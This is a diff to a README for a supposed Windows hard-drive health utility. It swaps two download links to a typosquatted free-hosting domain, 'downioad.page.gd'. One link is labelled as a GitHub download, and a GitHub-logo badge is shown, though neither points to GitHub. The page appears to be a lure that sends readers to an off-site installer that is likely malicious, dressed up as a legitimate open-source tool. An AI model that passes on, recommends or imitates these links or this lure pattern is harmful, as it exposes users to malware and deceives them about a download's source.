@@ -2,7 +2,7 @@
 
 HDD SMART Monitor 2026 Utility is a comprehensive and user-friendly tool designed for Windows 10 and 11 users to monitor and analyze the health of their hard disk drives (HDDs). By leveraging S.M.A.R.T. (Self-Monitoring, Analysis, and Reporting Technology) data, this utility provides real-time insights into drive performance, temperature, and potential failures, helping you prevent data loss and extend the lifespan of your storage devices. Whether you're a casual user or an IT professional, this tool offers an easy way to keep tabs on your hard drive's condition without any technical hassle.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ Ensure your drive is properly connected and recognized by Windows Disk Managemen
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## What's New in 2026
 
